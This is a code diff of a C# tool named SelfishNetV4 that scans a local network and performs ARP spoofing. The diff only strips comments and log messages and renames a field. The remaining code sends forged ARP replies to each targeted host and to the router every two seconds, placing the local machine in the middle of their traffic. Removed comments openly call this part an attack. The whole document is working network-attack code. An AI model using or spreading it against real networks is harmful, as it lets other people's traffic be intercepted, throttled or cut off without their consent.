@@ -38,7 +38,6 @@ namespace SelfishNetV4
 
             this.localMAC = device.MacAddress.GetAddressBytes();
 
-            // Detectar Router y Local IP
             foreach (var addr in device.Interface.GatewayAddresses)
             {
                 if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
@@ -69,7 +68,6 @@ namespace SelfishNetV4
             broadcastMac = new byte[] { 255, 255, 255, 255, 255, 255 };
         }
 
-        // --- 1. ESCUCHA (Listener) ---
         public void startArpListener()
         {
             if (!isListeningArp)
@@ -96,7 +94,7 @@ namespace SelfishNetV4
                 Array.Copy(rawPacket, 6, srcMac, 0, 6);
                 if (tools.areValuesEqual(srcMac, localMAC)) continue;
 
-                if (rawPacket[21] == 2) // ARP Reply
+                if (rawPacket[21] == 2)
                 {
                     byte[] senderIp = new byte[4];
                     byte[] senderMac = new byte[6];
@@ -107,9 +105,9 @@ namespace SelfishNetV4
                     newPc.ip = new IPAddress(senderIp);
                     newPc.mac = new PhysicalAddress(senderMac);
                     newPc.isGateway = tools.areValuesEqual(senderIp, routerIP);
-                    newPc.redirect = true; // Por defecto atacable
 
-                    // Si descubrimos al router real, guardamos su MAC
+                    newPc.Redirect = true;
+
                     if (newPc.isGateway) this.routerMAC = senderMac;
 
                     if (pcList.addPcToList(newPc))
@@ -120,7 +118,6 @@ namespace SelfishNetV4
             }
         }
 
-        // --- 2. DESCUBRIMIENTO (Scanner) ---
         public void startArpDiscovery()
         {
             if (!isDiscovering)
@@ -130,23 +127,18 @@ namespace SelfishNetV4
                 discoveringThread.Start();
             }
         }
-        
+
         private void discoverer()
         {
-            Console.WriteLine($"Escaneando red desde {new IPAddress(localIP)}...");
-
-            // 1. PRIORIDAD: Encontrar la MAC del Router inmediatamente
             if (routerIP != null)
             {
-                Console.WriteLine($"Buscando Router en: {new IPAddress(routerIP)}...");
-                for (int k = 0; k < 3; k++) // Intentarlo 3 veces rápido
+                for (int k = 0; k < 3; k++)
                 {
                     SendArpRequest(new IPAddress(routerIP));
                     Thread.Sleep(100);
                 }
             }
 
-            // 2. Escaneo normal del resto de la red
             byte[] currentIp = new byte[4];
             Array.Copy(localIP, currentIp, 3);
 
@@ -160,24 +152,21 @@ namespace SelfishNetV4
                     (routerIP == null || !tools.areValuesEqual(routerIP, target.GetAddressBytes())))
                 {
                     SendArpRequest(target);
-                    Thread.Sleep(10); // Pausa pequeña
+                    Thread.Sleep(10);
                 }
             }
             isDiscovering = false;
-            Console.WriteLine("Fin del escaneo.");
         }
 
-        // --- 3. ATAQUE (Spoofing) ---
         public void StartSpoofing()
         {
             if (!isSpoofing)
             {
                 if (routerMAC == null)
                 {
-                    Console.WriteLine("¡ERROR! No tengo la MAC del Router. Escanea primero.");
+                    Console.WriteLine("¡ERROR! No tengo la MAC del Router.");
                     return;
                 }
-
                 isSpoofing = true;
                 spoofingThread = new Thread(SpoofLoop);
                 spoofingThread.Start();
@@ -201,7 +190,7 @@ namespace SelfishNetV4
 
                     if (target.isLocalPc || target.isGateway) continue;
 
-                    if (target.redirect)
+                    if (target.Redirect)
                     {
                         SendArpReply(target.mac.GetAddressBytes(), target.ip.GetAddressBytes(),
                                     localMAC, routerIP);
@@ -210,7 +199,6 @@ namespace SelfishNetV4
                                     localMAC, target.ip.GetAddressBytes());
                     }
                 }
-
                 Thread.Sleep(2000);
             }
         }
@@ -218,7 +206,7 @@ namespace SelfishNetV4
         public void SendArpRequest(IPAddress targetIp)
         {
             byte[] packet = buildArpPacket(
-                broadcastMac, localMAC, 1, // 1 = Request
+                broadcastMac, localMAC, 1,
                 localMAC, localIP,
                 new byte[6], targetIp.GetAddressBytes()
             );
@@ -228,7 +216,7 @@ namespace SelfishNetV4
         public void SendArpReply(byte[] destMac, byte[] destIp, byte[] srcMac, byte[] srcIp)
         {
             byte[] packet = buildArpPacket(
-                destMac, localMAC, 2, // 2 = Reply
+                destMac, localMAC, 2,
                 srcMac, srcIp,
                 destMac, destIp
             );
